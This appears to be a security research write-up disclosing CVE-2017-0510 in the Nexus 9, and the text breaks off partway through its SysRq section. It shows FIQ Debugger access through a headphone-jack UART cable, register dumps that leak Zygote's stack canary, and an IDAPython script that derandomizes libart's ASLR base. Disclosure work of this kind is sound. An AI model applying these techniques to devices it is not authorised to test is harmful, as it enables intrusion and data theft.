@@ -1,0 +1,608 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-92665328-1"></script>
+<script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        
+        gtag('config', 'UA-92665328-1');
+    </script>
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+<title>Attacking Nexus 9 with Malicious Headphones</title>
+<meta name="name" content="Attacking Nexus 9 with Malicious Headphones">
+<meta name="description" content="A critical severity vulnerability in Nexus 9 (CVE-2017-0510) with a very unusual attack vector - headphone jack. Exploiting this vulnerability allows one to leak stack canaries, derandomize ASLR, conduct a factory reset, and even access HBOOT, allowing for communication with internal System-on-Chips (SoCs) through I2C.">
+<meta name="image" content="https://alephsecurity.com/assets/img/logo-black.png">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:site" content="@alephsecurity">
+<meta name="twitter:creator" content="@alephsecurity">
+<meta name="twitter:title" content="Attacking Nexus 9 with Malicious Headphones">
+<meta name="twitter:url" content="https://alephsecurity.com/2017/03/08/nexus9-fiq-debugger/">
+<meta name="twitter:description" content="A critical severity vulnerability in Nexus 9 (CVE-2017-0510) with a very unusual attack vector - headphone jack. Exploiting this vulnerability allows one to leak stack canaries, derandomize ASLR, conduct a factory reset, and even access HBOOT, allowing for communication with internal System-on-Chips (SoCs) through I2C.">
+<meta name="twitter:image:src" content="https://alephsecurity.com/assets/img/logo-black.png">
+<meta property="og:site_name" content="">
+<meta property="og:title" content="Attacking Nexus 9 with Malicious Headphones">
+<meta property="og:type" content="article">
+<meta property="og:description" content="A critical severity vulnerability in Nexus 9 (CVE-2017-0510) with a very unusual attack vector - headphone jack. Exploiting this vulnerability allows one to leak stack canaries, derandomize ASLR, conduct a factory reset, and even access HBOOT, allowing for communication with internal System-on-Chips (SoCs) through I2C.">
+<meta property="og:url" content="https://alephsecurity.com/2017/03/08/nexus9-fiq-debugger/">
+<meta property="article:published_time" content="2017-03-08T00:00:00+00:00">
+<meta property="article:author" content="https://alephsecurity.com">
+<meta property="og:image" content="https://alephsecurity.com/assets/img/logo-black.png">
+<link rel="icon" href="/favicon.png">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inconsolata:400,700">
+<link rel="stylesheet" type="text/css" href="/assets/css/main.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.7.1/katex.min.css" integrity="sha384-wITovz90syo1dJWVh32uuETPVEtGigN07tkttEqPv+uR2SE/mbQcG7ATL28aI9H0" crossorigin="anonymous">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.7.1/katex.min.js" integrity="sha384-/y1Nn9+QQAipbNQWU65krzJralCnuOasHncUFXGkdwntGeSvQicrYkiUBwsgUqc1" crossorigin="anonymous"></script>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      messageStyle: "none",
+      tex2jax: {preview: "none"},
+      CommonHTML: { linebreaks: { automatic: true } },
+      "HTML-CSS": { linebreaks: { automatic: true } },
+      SVG: { linebreaks: { automatic: true } }
+    });
+    </script>
+<script type="text/javascript" async src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML">
+    </script>
+</head>
+<body>
+<div class="wrapper">
+<div class="page__back">
+<a href="/">&lt;-- <span class="smallogo">א</span></a>
+</div>
+<div class="page">
+<div class="page__post">
+<div class="page__title">
+<h1>Attacking Nexus 9 with Malicious Headphones</h1>
+</div>
+By <a href="/authors/roeeh">Roee Hay</a> (<a href="https://twitter.com/roeehay">@roeehay</a>)
+<br>
+<div class="page__date"><span>March 8, 2017</span></div>
+* <div class="page__refs"><span>
+<br> <div class="cve-critical"><span class="" title="Google Nexus 9 Unauthorized Access to FIQ Debugger"><a href="/vulns/aleph-2017000">CVE-2017-0510</a></span></div> <div class="cve-critical"><span class="" title="Google Nexus 9 Cypress SAR Firmware Injection via I2C"><a href="/vulns/aleph-2017009">CVE-2017-0563</a></span></div> <div class="cve-moderate"><span class="" title="Google Nexus 9 SensorHub Firmware Downgrade Vulnerability"><a href="/vulns/aleph-2017010">CVE-2017-0582</a></span></div>
+</span></div>
+<br>
+* <div class="page__commentcount"><span><a href="https://alephsecurity.com/2017/03/08/nexus9-fiq-debugger/#disqus_thread"></a></span></div>
+<div class="page__content" ?>
+<p>In the <a href="https://source.android.com/security/bulletin/2017-03-01.html#eop-in-kernel-fiq-debugger">March 2017 Android Security Bulletin</a>, Google released a patch to <span class="cve-critical" title="Google Nexus 9 Unauthorized Access to FIQ Debugger"><a href="/vulns/aleph-2017000">CVE-2017-0510</a></span>, a critical severity vulnerability in Nexus 9 we discovered and responsiblity disclosed a few months ago. This vulnerability has a very unusual attack vector – headphones. By exploiting this vulnerability we managed to leak stack canaries, derandomize <code class="language-plaintext highlighter-rouge">ASLR</code>, conduct a factory reset, and even access <code class="language-plaintext highlighter-rouge">HBOOT</code>, allowing for communication with internal System-on-Chips (SoCs) through I\(^2\)C.</p>
+<h2 id="table-of-contents">Table of Contents</h2>
+<ol>
+<li><a href="#background">Background</a></li>
+<li><a href="#a-new-survey">A New Survey</a></li>
+<li><a href="#fiq-debugger">FIQ Debugger</a></li>
+<li><a href="#listening-to-your-stack-canaries">Listening to your Stack Canaries</a></li>
+<li><a href="#aslr">ASLR</a></li>
+<li><a href="#sysrq">SysRq</a></li>
+<li><a href="#HBOOT">HBOOT</a></li>
+<li><a href="#42-answer-to-the-ultimate-question-of-life-the-universe-and-everything">42: Answer to the Ultimate Question of Life, the Universe, and Everything</a></li>
+<li><a href="#accessing-i2c-buses">Accessing I\(^2\)C Buses</a></li>
+<li><a href="#factory-reset">Factory Reset</a></li>
+<li><a href="#patch">Patch</a></li>
+</ol>
+<h2 id="background">Background</h2>
+<p>In their <a href="https://media.blackhat.com/us-13/US-13-Ossmann-Multiplexed-Wired-Attack-Surfaces-WP.pdf">BlackHat 2013 paper</a>, Michael Ossmann &amp; Kyle Osborn showed that multiplexed wired functionality exists in several mobile phones. Their research mainly focused on the USB socket. In the paper, they presented interesting results on various variants of Galaxy Nexus. For example, they showed that with Galaxy Nexus running CyanogenMod (CM), one could get access to the <code class="language-plaintext highlighter-rouge">FIQ Debugger</code> (<a href="#fiq-debugger">see next</a>) together with an unprivileged shell. More severely, on Samsung Galaxy S3 running CM they have also got a root shell. Ossmann &amp; Osborn also briefly documented multiplexed audio connectors, noting that Nexus 4 has a <code class="language-plaintext highlighter-rouge">TTL UART</code> interface hidden in its headphone jack, a functionality which is enabled if the voltage on the <code class="language-plaintext highlighter-rouge">MIC</code> pin exceeds some threshold.</p>
+<p>Fast-forward to 2017, nowadays it’s a well known fact that the Nexus devices (Pixel too) have this kind of functionality in their headphone jack. There are multiple examples of people <a href="http://www.pabr.org/consolejack/consolejack.en.html">building and documenting</a> their cables.</p>
+<h2 id="a-new-survey">A New Survey</h2>
+<p>We were curious, so <a href="https://sagi.io/">Sagi Kedmi</a> (<a href="https://twitter.com/sagikedmi">@sagikedmi</a>) suggested we would also assemble our own cable. We decided to go with the standard <a href="https://www.sparkfun.com/products/12731">FTDI232RL breakout board</a>:</p>
+<p><img src="/assets/img/ftdi232rl.jpg" alt="FTDI232RL" /></p>
+<p>We then tested it over recent Google devices, running the latest available build with a locked bootloader (BL):</p>
+<table>
+<thead>
+<tr>
+<th>Device</th>
+<th>Build</th>
+<th>Access</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Nexus 5</td>
+<td>M4B30Z</td>
+<td>BL &amp; Platform kernel logs</td>
+<td> </td>
+</tr>
+<tr>
+<td>Nexus 5X</td>
+<td>N4F26O</td>
+<td>BL &amp; Platform kernel logs</td>
+<td> </td>
+</tr>
+<tr>
+<td>Nexus 6</td>
+<td>NBD91Y</td>
+<td>BL &amp; Platform kernel logs</td>
+<td>Platform log can be switched on/off via fastboot oem cmd on locked BL</td>
+</tr>
+<tr>
+<td>Nexus 6P</td>
+<td>N4F26O</td>
+<td>BL &amp; Platform kernel logs</td>
+<td>Platform log can be switched on/off via fastboot oem cmd on locked BL. If enabled, will not boot the platform without a debug cable connected</td>
+</tr>
+<tr>
+<td>Pixel</td>
+<td>NOF26V</td>
+<td>BL &amp; Platform kernel logs</td>
+<td>Platform log can be switched on/off via fastboot oem cmd on unlocked BL</td>
+</tr>
+<tr>
+<td>Pixel C</td>
+<td>N4F26O</td>
+<td>None</td>
+<td> </td>
+</tr>
+<tr>
+<td>Nexus 9</td>
+<td>N4F26Q</td>
+<td>BL &amp; Platform kernel logs, <code class="language-plaintext highlighter-rouge">FIQ Debugger</code>, <code class="language-plaintext highlighter-rouge">HBOOT</code></td>
+<td> </td>
+</tr>
+</tbody>
+</table>
+<p>All but Pixel C had the multiplexed functionality. It should be noted some devices also required us to enable <code class="language-plaintext highlighter-rouge">UART</code> via a proprietary <code class="language-plaintext highlighter-rouge">fastboot oem</code> command (e.g <code class="language-plaintext highlighter-rouge">oem uart enable</code>). To our surprise, Nexus 9 behaved quite differently, having extra functionalities beyond debug messages, and beyond the <code class="language-plaintext highlighter-rouge">FIQ Debugger</code>.</p>
+<p>In the next sections we will study some internals behind the vulnerability and its security impact.</p>
+<h2 id="fiq-debugger">FIQ Debugger</h2>
+<p>When we first booted up Nexus 9 with the <code class="language-plaintext highlighter-rouge">UART</code> cable attached, we noticed something familiar:</p>
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">smc_undefined:66: param0: 0x0
+smc_undefined:66: param1: 0x0
+smc_undefined:66: param2: 0x0
+smc_undefined:66: Undefined monitor call!
+smc_undefined:66: SMC: 0x32000002 (Stdcall entity 50 function 0x2)
+smc_undefined:66: param0: 0x0
+smc_undefined:66: param1: 0x0
+smc_undefined:66: param2: 0x0
+</span><span class="gp">&lt;hit enter to activate fiq debugger&gt;</span><span class="w">
+</span><span class="gp">debug&gt;</span><span class="w">
+</span></code></pre></div></div>
+<p>Similarly to what Ossman &amp; Osbord have shown on older Android devices, one could access the <code class="language-plaintext highlighter-rouge">FIQ Debugger</code> on Nexus 9 as well, although without a shell on <code class="language-plaintext highlighter-rouge">user</code> (production) builds. It should be noted that the <code class="language-plaintext highlighter-rouge">FIQ Debugger</code> functionality is enabled even if the <code class="language-plaintext highlighter-rouge">UART</code> cable is inserted when the platform is up.</p>
+<p>The <code class="language-plaintext highlighter-rouge">FIQ</code> (<em>Fast Interrupt Request</em>) debugger module which we can apparently access in Nexus 9 is implemented mainly by <a href="https://android.googlesource.com/kernel/tegra/+/android-7.1.1_r0.13/drivers/staging/android/fiq_debugger/fiq_debugger.c">fiq_debugger.c</a> and <a href="https://android.googlesource.com/kernel/tegra/+/android-7.1.1_r0.13/drivers/platform/tegra/tegra_fiq_debugger.c">tegra_fiq_debugger.c</a> in the tegra kernel tree.</p>
+<p>Whenever a keystroke is sent to the device via <code class="language-plaintext highlighter-rouge">UART</code>, an <code class="language-plaintext highlighter-rouge">FIQ</code> is generated, which eventually (and probably after visiting some ARM Monitor mode code) reaches <code class="language-plaintext highlighter-rouge">fiq_debugger_handle_uart_interrupt</code> that dispatches the relevant command handler.</p>
+<p>In order to speed-up the work of the researcher, the <code class="language-plaintext highlighter-rouge">FIQ Debugger</code> interface provides a <code class="language-plaintext highlighter-rouge">help</code> command:</p>
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">debug&gt;</span><span class="w"> </span><span class="nb">help</span>
+<span class="go">FIQ Debugger commands:
+    pc            PC status
+    regs          Register dump
+    allregs       Extended Register dump
+    bt            Stack trace
+</span><span class="gp">    reboot [&lt;c&gt;</span><span class="o">]</span>  Reboot with <span class="nb">command</span> &lt;c&gt;
+<span class="gp">    reset [&lt;c&gt;</span><span class="o">]</span>   Hard reset with <span class="nb">command</span> &lt;c&gt;
+<span class="go">    irqs          Interupt status
+    kmsg          Kernel log
+    version       Kernel version
+    sleep         Allow sleep while in FIQ
+    nosleep       Disable sleep while in FIQ
+    console       Switch terminal to console
+    cpu           Current CPU
+</span><span class="gp">    cpu &lt;number&gt;</span><span class="w">  </span>Switch to CPU&lt;number&gt;
+<span class="go">    ps            Process list
+    sysrq         sysrq options
+</span><span class="gp">    sysrq &lt;param&gt;</span><span class="w"> </span>Execute sysrq with &lt;param&gt;
+</code></pre></div></div>
+<p>The list of available commands clearly indicates the attacker may exfiltrate a lot of sensitive information by interacting with the <code class="language-plaintext highlighter-rouge">FIQ Debugger</code>. For example, the attacker can dump the process list:</p>
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">debug&gt;</span><span class="w"> </span>ps
+<span class="go">pid   ppid  prio task            pc
+1     0  120 init          S ffffffc0000868f4
+2     0  120 kthreadd      S ffffffc0000868f4
+3     2  120 ksoftirqd/0   S ffffffc0000868f4
+4     2  120 kworker/0:0   S ffffffc0000868f4
+5     2  100 kworker/0:0H  S ffffffc0000868f4
+</span><span class="c">...
+</span><span class="go">837   250  110 ndroid.settin S ffffffc0000868f4
+842   250  129 Jit thread po S ffffffc0000868f4
+843   250  120 Signal Catche S ffffffc0000868f4
+844   250  120 JDWP          S ffffffc0000868f4
+845   250  120 ReferenceQueu S ffffffc0000868f4
+</span><span class="c">...
+</span><span class="go">869     2  120 kworker/1:3   S ffffffc0000868f4
+</span><span class="gp">debug&gt;</span><span class="w">
+</span></code></pre></div></div>
+<p>By using the <code class="language-plaintext highlighter-rouge">console</code> command, for example, it’s possible to view the kernel log (similar to other Nexus devices), and receive an unprivileged shell (<strong>not on production (<code class="language-plaintext highlighter-rouge">user</code>) builds</strong> – on <code class="language-plaintext highlighter-rouge">userdebug</code>, <code class="language-plaintext highlighter-rouge">eng</code> builds only!)</p>
+<p>Using the <code class="language-plaintext highlighter-rouge">bt</code>/<code class="language-plaintext highlighter-rouge">regs</code>/<code class="language-plaintext highlighter-rouge">allregs</code> commands allows the attacker to dump the registers, and when falling under the kernel context, the call stack too. Unlike a normal debugger we cannot modify memory and/or place breakpoints, however since the <code class="language-plaintext highlighter-rouge">FIQ</code> preempts, the dumped information will be of an arbitrary process. In order to validate this assumption, we first created a tiny app that sets one of the registers to <code class="language-plaintext highlighter-rouge">0x1234</code> in an infinite loop:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="k">for</span> <span class="p">(;;)</span> <span class="p">{</span> <span class="n">asm</span><span class="p">(</span><span class="s">"MOV x0,#0x1234"</span><span class="p">);</span> <span class="p">}</span>
+</code></pre></div></div>
+<p>We expected that we will eventually hit the context of the app’s process, with <code class="language-plaintext highlighter-rouge">x0 = 0x1234</code>. Indeed:</p>
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">debug&gt;</span><span class="w"> </span>bt
+<span class="go">pid: 0  comm: swapper/0
+ x0 0000000000000000  x1 ffffffc000f7a400
+ x2 0000000000000000  x3 ffffffc0006f4950
+</span><span class="c"> ....
+</span><span class="gp">debug&gt;</span><span class="w"> </span>bt
+<span class="go">pid: 2363 comm: Thread-2
+ x0 0000000000001234  x1 00000070d3406774  
+ x2 0000000000000000  x3 00000070cf580c00
+ x4 00000070d3406be8  x5 00000070d92b6080
+ x6 8080808080808080  x7 0000000000000000
+</span><span class="c"> ....
+</span></code></pre></div></div>
+<h2 id="listening-to-your-stack-canaries">Listening to your Stack Canaries</h2>
+<p>Our next step was to prove we can leak something more sensitive – the <strong>Stack Canary</strong> value of Zygote, which is shared between all Android apps. (Due to the fact all Android apps are forked from Zygote without an exec syscall.).</p>
+<p>We first created a small app that dumps the canary to logcat:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">__android_log_print</span><span class="p">(</span><span class="n">ANDROID_LOG_VERBOSE</span><span class="p">,</span> <span class="n">APPNAME</span><span class="p">,</span> 
+                   <span class="s">"_stack_chk_guard: %llx"</span><span class="p">,</span> 
+                   <span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">__stack_chk_guard</span><span class="p">);</span>
+</code></pre></div></div>
+<p>And the canary was:</p>
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">02-01 16:30:35.623 .. V NATIVE: _stack_chk_guard: 0a2b6c120521b7c6
+</span></code></pre></div></div>
+<p>We then created a small PoC that dumps the registers in a successive manner. Eventually we fell under the context of a stack-protected function – reg <code class="language-plaintext highlighter-rouge">x26</code> contains the canary value!</p>
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">pid: 1300  comm: system_server
+  x0 0000000012ed8624   x1 0000000000000000
+  x2 0000000000000004   x3 0000007ffb44fa40
+  x4 0000007ffb44fa38   x5 0000007ffb44fa30
+  x6 000000000000000c   x7 0000000000000000
+  x8 0000000000000000   x9 00000075a06498d0
+ x10 0000000000000000  x11 0000000012ed8618
+ x12 000000000000000a  x13 000000000000000b
+ x14 0000000000000000  x15 2e8ba2e8ba2e8ba3
+ x16 00000075a05f97d8  x17 00000075a1b27b80
+ x18 0000000012e2d6c0  x19 00000075a0649700
+ x20 00000075a063fa00  x21 0000000000000002
+ x22 0000000000580310  x23 0000000000000034
+ x24 0000000012ed85f0  x25 000000000000000e
+ x26 0a2b6c120521b7c6  x27 0000000012d6cba0
+ x28 0000000012d2e1d0  x29 0000007ffb44faa0
+ x30 00000075a02c90b0   sp 0000007ffb44f9e0
+  pc 00000075a02c90cc cpsr 80000000 (EL0t)
+</span></code></pre></div></div>
+<p>Disassembling near <code class="language-plaintext highlighter-rouge">00000075a02c90cc</code> under <code class="language-plaintext highlighter-rouge">system_server</code> shows that it belongs to the <code class="language-plaintext highlighter-rouge">art::gc::Heap::AllocObjectWithAllocator</code> function. Indeed <code class="language-plaintext highlighter-rouge">x26</code> is assigned with <code class="language-plaintext highlighter-rouge">__stack_chk_guard</code> value:</p>
+<div class="nakedtable">
+<table>
+<thead>
+<tr>
+<th style="text-align: center"><img src="/assets/img/stack_chk_prolog.png" alt="Stack Canary Prolog" /></th>
+<th style="text-align: center"><img src="/assets/img/stack_chk_epilog.png" alt="Stack Canary Epilog" class="img-responsive" /></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: center">Prologue</td>
+<td style="text-align: center">Epilogue</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h2 id="aslr">ASLR</h2>
+<p>It is no surprise that being able to view arbitrary CPU contexts with addresses included is bad news for <code class="language-plaintext highlighter-rouge">ASLR</code>, which is in charge of randomizing various addresses, such as of the heap, stack, shared libraries and the executable image itself.</p>
+<p>In this post we will focus on libraries only, although it should be fairly safe to claim that this vulnerability significantly weakens <code class="language-plaintext highlighter-rouge">ASLR</code> for all of the above.
+As mentioned before, by exploiting this vulnerability one can preempt an arbitrary process, and dump the CPU registers.
+For example, here is a registers’ dump for <code class="language-plaintext highlighter-rouge">Chrome</code>:</p>
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">pid: 2856  comm: .android.chrome
+ r0 d51fce86  r1 001a517c  r2 b914880d  r3 ff8f754c
+ r4 e2b081c0  r5 007797ec  r6 d44127ec  r7 e7ac0430
+ r8 12de1940  r9 ff8f7470 r10 dcc65a94 r11 00000000
+ ip f13eb860  sp ff8f73a8  lr eedd78ef  pc eedd5ac8
+ cpsr 80070030 (USR)
+</span></code></pre></div></div>
+<p>Viewing the value of the <code class="language-plaintext highlighter-rouge">PC</code> register, <code class="language-plaintext highlighter-rouge">0xeedd5ac8</code> in this case, clearly reveals some information. However, in order to conduct a practical attack against <code class="language-plaintext highlighter-rouge">ASLR</code>, we need to deduce to which library this address belongs and what its base address is.</p>
+<p>As for the first part, a statistical approach can be taken. We could calculate, a priori, the hit frequency of each loaded library (with respect to the app). While we did not perform that experiment, we have a strong feeling that the empirical distribution will have a low entropy.</p>
+<p>Back to the example, this address falls under <code class="language-plaintext highlighter-rouge">libart</code>, the runtime. We assume that there is a high probability to preempt the process (via FIQ) when it visits that library, although unconfirmed. Equipped with this knowledge, how can one derandomize the base address of <code class="language-plaintext highlighter-rouge">libart</code>?</p>
+<p>We can see that <code class="language-plaintext highlighter-rouge">PC</code>’s least significant 12 bits, which are unaffected by <code class="language-plaintext highlighter-rouge">ASLR</code>, are <code class="language-plaintext highlighter-rouge">0xac8</code>. We can then take this dynamic information and search for all of the instructions with the relevant addresses – unfortunately there are a lot. Despite that, there are maybe additional registers we can leverage. For example, the link register – <code class="language-plaintext highlighter-rouge">LR</code>. This has led to our next experiment: by using <code class="language-plaintext highlighter-rouge">idapython</code> we statically searched for all functions that contain an xref from an address that ends with <code class="language-plaintext highlighter-rouge">0x8ef-1-4</code> or <code class="language-plaintext highlighter-rouge">0x8ef-1-2</code> (the -1 and multiple instruction sizes are because of <code class="language-plaintext highlighter-rouge">THUMB</code>), and that have an instruction at an address that ends with <code class="language-plaintext highlighter-rouge">0xac8</code>.</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">idautils</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">idaapi</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">LR</span> <span class="o">=</span> <span class="mh">0xeedd78ef</span>
+<span class="n">PC</span> <span class="o">=</span> <span class="mh">0xeedd5ac8</span>
+
+<span class="n">MASK</span> <span class="o">=</span> <span class="mi">2</span><span class="o">**</span><span class="mi">12</span><span class="o">-</span><span class="mi">1</span>
+
+<span class="k">for</span> <span class="n">fea</span> <span class="ow">in</span> <span class="n">Functions</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0xFFFFFFFF</span><span class="p">):</span>
+    <span class="n">fname</span> <span class="o">=</span> <span class="n">GetFunctionName</span><span class="p">(</span><span class="n">fea</span><span class="p">)</span>
+    <span class="n">dfname</span> <span class="o">=</span> <span class="n">Demangle</span><span class="p">(</span><span class="n">fname</span><span class="p">,</span><span class="n">GetLongPrm</span><span class="p">(</span><span class="n">INF_SHORT_DN</span><span class="p">));</span>
+    
+    <span class="n">b</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="k">for</span> <span class="n">xref</span> <span class="ow">in</span> <span class="n">CodeRefsTo</span><span class="p">(</span><span class="n">fea</span><span class="p">,</span> <span class="mi">0</span><span class="p">):</span>
+        <span class="k">if</span> <span class="p">((</span><span class="n">LR</span><span class="o">-</span><span class="mi">5</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">MASK</span> <span class="o">==</span> <span class="p">(</span><span class="n">xref</span> <span class="o">&amp;</span> <span class="n">MASK</span><span class="p">))</span> <span class="ow">or</span> \
+           <span class="p">((</span><span class="n">LR</span><span class="o">-</span><span class="mi">3</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">MASK</span> <span class="o">==</span> <span class="p">(</span><span class="n">xref</span> <span class="o">&amp;</span> <span class="n">MASK</span><span class="p">)):</span>
+            <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">FuncItems</span><span class="p">(</span><span class="n">fea</span><span class="p">):</span>
+                <span class="k">if</span> <span class="n">PC</span> <span class="o">&amp;</span> <span class="n">MASK</span> <span class="o">==</span> <span class="p">(</span><span class="n">x</span> <span class="o">&amp;</span> <span class="n">MASK</span><span class="p">):</span>                   
+                    <span class="k">print</span> <span class="s">"%x: %s"</span> <span class="o">%</span> <span class="p">(</span><span class="n">x</span><span class="p">,</span>  <span class="n">dfname</span> <span class="ow">or</span> <span class="n">fname</span><span class="p">)</span>
+                    <span class="n">b</span> <span class="o">=</span> <span class="mi">1</span>
+                    
+            <span class="k">if</span> <span class="n">b</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
+                <span class="k">break</span>
+</code></pre></div></div>
+<p>This script yielded only 6 results under <code class="language-plaintext highlighter-rouge">libart</code> (rebased at zero), significantly reducing the <code class="language-plaintext highlighter-rouge">ASLR</code> entropy:</p>
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">eec11ac8: art::gc::Heap::AllocObjectWithAllocator&lt;true,true,art::mirror::Class::InitializeClassVisitor&gt;</span><span class="o">(</span>art::Thread <span class="k">*</span>,art::mirror::Class<span class="k">*</span>,uint,art::gc::AllocatorType,art::mirror::Class::InitializeClassVisitor const&amp;<span class="o">)</span>
+<span class="go">eec5dac8: mspace_malloc
+eed60ac8: art::jit::Jit::MaybeDoOnStackReplacement(art::Thread *,art::ArtMethod *,uint,int,art::JValue *)
+eedd5ac8: art::OatFile::End(void)
+eee42ac8: art::Thread::PassActiveSuspendBarriers(art::Thread*)
+eee5eac8: art::PrettyMethod(art::ArtMethod *,bool)
+</span></code></pre></div></div>
+<p>One can then reduce the results even further. We made a short experiment, rebooted the device several times a recorded the mapped location of <code class="language-plaintext highlighter-rouge">libart.so</code>:</p>
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">addr=0xee11a000
+addr=0xf021a000
+addr=0xeac9a000
+addr=0xf039a000
+addr=0xe6c1a000
+addr=0xeab1a000
+addr=0xe761a000
+addr=0xef69a000
+addr=0xef09a000
+addr=0xeea9a000
+addr=0xe559a000
+addr=0xebe9a000
+addr=0xeec9a000
+addr=0xeed1a000
+</span></code></pre></div></div>
+<p>We can notice, even without getting into the fine details of the address mapping algorithm, that the 19 least significant bits, <code class="language-plaintext highlighter-rouge">0011010000000000000</code>, are shared among all reboots. Thus we can take that into consideration, and re-run our script, this time with <code class="language-plaintext highlighter-rouge">MASK = 2**19-1</code>: (We also rebased the image to <code class="language-plaintext highlighter-rouge">0x1a000</code>.)</p>
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">2d5ac8: art::OatFile::End(void)
+</span></code></pre></div></div>
+<p>This implies the following <code class="language-plaintext highlighter-rouge">libart</code> base address: <code class="language-plaintext highlighter-rouge">0xeedd5ac8 - 0x2d5ac8 + 0x1a000 = 0xeeb1a000</code>, and indeed:</p>
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">flounder:/proc/2856 #</span><span class="w"> </span><span class="nb">cat </span>maps | <span class="nb">grep </span>libart.so
+<span class="go">eeb1a000-eef74000 r-xp 00000000 fd:00 985     /system/lib/libart.so
+eef74000-eef7c000 r--p 00459000 fd:00 985     /system/lib/libart.so
+eef7c000-eef7e000 rw-p 00461000 fd:00 985     /system/lib/libart.so
+</span></code></pre></div></div>
+<p>Since <code class="language-plaintext highlighter-rouge">libart.so</code> is loaded by <code class="language-plaintext highlighter-rouge">zygote</code>, and due to the <a href="https://taesoo.gtisc.gatech.edu/pubs/2014/lee:morula.pdf">Android app forking model</a>, it will be loaded into all apps under the same virtual address.</p>
+<p>It’s also worth noting that if one still receives multiple candidates, they can be reduced even further. For example, by leveraging other registers, or creating a heat-map within the library itself together with contextual information, as it is possible that hit process does not even (transitively) call some of these candidates.</p>
+<p>Conversely, finding no candidates at all, indicates that we chose the wrong libary (e.g. the called code is not of <code class="language-plaintext highlighter-rouge">libart.so</code>, but rather of another lib loaded by the preempted process, or of the application itself).</p>
+<h2 id="sysrq">SysRq</h2>
+<p>Interestingly, the <code class="language-plaintext highlighter-rouge">FIQ Debugger</code> provides a <code class="language-plaintext highlighter-rouge">sysrq</code> command, which should provide access to the Linux <a href="https://en.wikipedia.org/wiki/Magic_SysRq_key">SysRq</a> interface. Despite that, hitting <code class="language-plaintext highlighter-rouge">sysrq</code> after the platform has loaded returns nothing:</p>
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">debug&gt;</span><span class="w"> </span>sysrq
+<span class="gp">debug&gt;</span><span class="w">
+</span></code></pre></div></div>
+<p>Digging into the code which handles the FIQ <code class="language-plaintext highlighter-rouge">sysrq</code> command, reveals the reason:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">void</span> <span class="nf">fiq_debugger_do_sysrq</span><span class="p">(</span><span class="k">struct</span> <span class="n">fiq_debugger_state</span> <span class="o">*</span><span class="n">state</span><span class="p">,</span> <span class="kt">char</span> <span class="n">rq</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="k">if</span> <span class="p">((</span><span class="n">rq</span> <span class="o">==</span> <span class="sc">'g'</span> <span class="o">||</span> <span class="n">rq</span> <span class="o">==</span> <span class="sc">'G'</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">fiq_kgdb_enable</span><span class="p">)</span> <span class="p">{</span>
+		<span class="n">fiq_debugger_printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">state</span><span class="o">-&gt;</span><span class="n">output</span><span class="p">,</span> <span class="s">"sysrq-g blocked</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+		<span class="k">return</span><span class="p">;</span>
+	<span class="p">}</span>
+	<span class="n">fiq_debugger_begin_syslog_dump</span><span class="p">(</span><span class="n">state</span><span class="p">);</span>
+	<span class="n">handle_sysrq</span><span class="p">(</span><span class="n">rq</span><span class="p">);</span>
+	<span class="n">fiq_debugger_end_syslog_dump</span><span class="p">(</span><span class="n">state</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">handle_sysrq</span><span class="p">(</span><span class="kt">int</span> <span class="n">key</span><span class="p">)</span>
+<span class="p">{</span>
